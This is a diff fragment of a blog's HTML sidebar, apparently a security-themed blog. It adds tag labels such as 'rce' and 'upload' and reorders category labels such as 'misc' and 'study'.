+        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
     
         <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
+    
+        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
     
         <span class="sidebar-tag-name" data-tags="Flow-Analysis"><span class="iconfont-archer">&#xe606;</span>Flow-Analysis</span>
     
@@ -4874,9 +4948,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
     
-        <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
-    
         <span class="sidebar-category-name" data-categories="study"><span class="iconfont-archer">&#xe60a;</span>study</span>
+    
+        <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
     
         <span class="sidebar-category-name" data-categories="crypto"><span class="iconfont-archer">&#xe60a;</span>crypto</span>
     
